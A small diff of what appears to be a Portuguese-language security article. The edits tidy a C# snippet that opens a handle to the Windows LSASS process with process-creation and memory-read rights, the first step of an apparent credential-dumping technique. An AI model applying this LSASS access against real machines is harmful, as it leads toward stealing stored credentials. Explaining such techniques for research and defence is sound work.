@@ -19,9 +19,9 @@ No código, primeiro é aberto um novo handle pro LSASS com o privilégio `PROCE
 
 ```csharp
 uint accessParentProcess = PROCESS_CREATE_PROCESS;
-uint accessChildProcess = PROCESS_QUERY_INFORMATION | PROCESS_VM_READ ;
+uint accessChildProcess = PROCESS_QUERY_INFORMATION | PROCESS_VM_READ;
 
-IntPtr hParentProcess = OpenProcess((uint)accessParentProcess, false, Convert.ToUInt32(pid)); // abrindo um handle ao LSASS com PROCESS_CREATE_PROCESS
+IntPtr hParentProcess = OpenProcess((uint)accessParentProcess, false, Convert.ToUInt32(pid)); // abrindo um handle ao LSASS com acesso de PROCESS_CREATE_PROCESS
 
 Console.WriteLine($"[+] Handle: {hParentProcess}");
 
